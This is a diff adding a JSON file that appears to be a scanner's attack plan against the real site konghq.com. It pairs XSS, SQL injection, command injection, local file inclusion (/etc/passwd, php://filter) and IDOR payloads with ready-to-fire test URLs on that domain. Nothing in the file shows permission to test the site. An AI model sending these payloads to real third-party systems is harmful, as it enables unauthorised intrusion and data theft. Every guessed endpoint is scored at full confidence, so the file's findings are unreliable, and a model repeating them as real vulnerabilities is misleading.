@@ -1,0 +1,162 @@
+{
+  "target": "https://konghq.com",
+  "domain": "konghq.com",
+  "timestamp": "2025-12-01T10:15:30.055731",
+  "predictions": [
+    {
+      "type": "XSS",
+      "confidence": 1.0,
+      "endpoints_to_test": [
+        "/search",
+        "/query",
+        "/api/search",
+        "/v1/search",
+        "/find"
+      ],
+      "parameters": [
+        "q",
+        "query",
+        "search",
+        "term",
+        "keyword"
+      ],
+      "sample_payloads": [
+        "<script>alert(1)</script>",
+        "<img src=x onerror=alert(1)>",
+        "\"><script>alert(1)</script>"
+      ],
+      "test_urls": [
+        "https://konghq.com/search?q={payload}",
+        "https://konghq.com/search?query={payload}",
+        "https://konghq.com/query?q={payload}",
+        "https://konghq.com/query?query={payload}",
+        "https://konghq.com/api/search?q={payload}",
+        "https://konghq.com/api/search?query={payload}"
+      ]
+    },
+    {
+      "type": "SQLI",
+      "confidence": 1.0,
+      "endpoints_to_test": [
+        "/api/users",
+        "/v1/users",
+        "/api/data",
+        "/v1/data",
+        "/api/records"
+      ],
+      "parameters": [
+        "id",
+        "user_id",
+        "uid",
+        "account",
+        "token"
+      ],
+      "sample_payloads": [
+        "' OR '1'='1",
+        "' OR 1=1 --",
+        "' UNION SELECT 1,2,3 --"
+      ],
+      "test_urls": [
+        "https://konghq.com/api/users?id={payload}",
+        "https://konghq.com/api/users?user_id={payload}",
+        "https://konghq.com/v1/users?id={payload}",
+        "https://konghq.com/v1/users?user_id={payload}",
+        "https://konghq.com/api/data?id={payload}",
+        "https://konghq.com/api/data?user_id={payload}"
+      ]
+    },
+    {
+      "type": "COMMAND_INJECTION",
+      "confidence": 1.0,
+      "endpoints_to_test": [
+        "/api/ping",
+        "/api/health",
+        "/api/status",
+        "/api/trace",
+        "/api/debug"
+      ],
+      "parameters": [
+        "ip",
+        "host",
+        "domain",
+        "url",
+        "address"
+      ],
+      "sample_payloads": [
+        "127.0.0.1; whoami",
+        "127.0.0.1 | ls",
+        "127.0.0.1 && echo test"
+      ],
+      "test_urls": [
+        "https://konghq.com/api/ping?ip={payload}",
+        "https://konghq.com/api/ping?host={payload}",
+        "https://konghq.com/api/health?ip={payload}",
+        "https://konghq.com/api/health?host={payload}",
+        "https://konghq.com/api/status?ip={payload}",
+        "https://konghq.com/api/status?host={payload}"
+      ]
+    },
+    {
+      "type": "LFI",
+      "confidence": 1.0,
+      "endpoints_to_test": [
+        "/file",
+        "/download",
+        "/view",
+        "/document",
+        "/template"
+      ],
+      "parameters": [
+        "file",
+        "path",
+        "document",
+        "template",
+        "page"
+      ],
+      "sample_payloads": [
+        "../../../../../etc/passwd",
+        "php://filter/read=convert.base64-encode/resource=config.php"
+      ],
+      "test_urls": [
+        "https://konghq.com/file?file={payload}",
+        "https://konghq.com/file?path={payload}",
+        "https://konghq.com/download?file={payload}",
+        "https://konghq.com/download?path={payload}",
+        "https://konghq.com/view?file={payload}",
+        "https://konghq.com/view?path={payload}"
+      ]
+    },
+    {
+      "type": "IDOR",
+      "confidence": 1.0,
+      "endpoints_to_test": [
+        "/api/profile",
+        "/api/account",
+        "/api/user",
+        "/profile",
+        "/account"
+      ],
+      "parameters": [
+        "user_id",
+        "account_id",
+        "profile_id",
+        "wallet_id",
+        "transaction_id"
+      ],
+      "sample_payloads": [
+        "user_id=1",
+        "user_id=2",
+        "user_id=3"
+      ],
+      "test_urls": [
+        "https://konghq.com/api/profile?user_id={payload}",
+        "https://konghq.com/api/profile?account_id={payload}",
+        "https://konghq.com/api/account?user_id={payload}",
+        "https://konghq.com/api/account?account_id={payload}",
+        "https://konghq.com/api/user?user_id={payload}",
+        "https://konghq.com/api/user?account_id={payload}"
+      ]
+    }
+  ],
+  "total_confidence": 1.0
+}
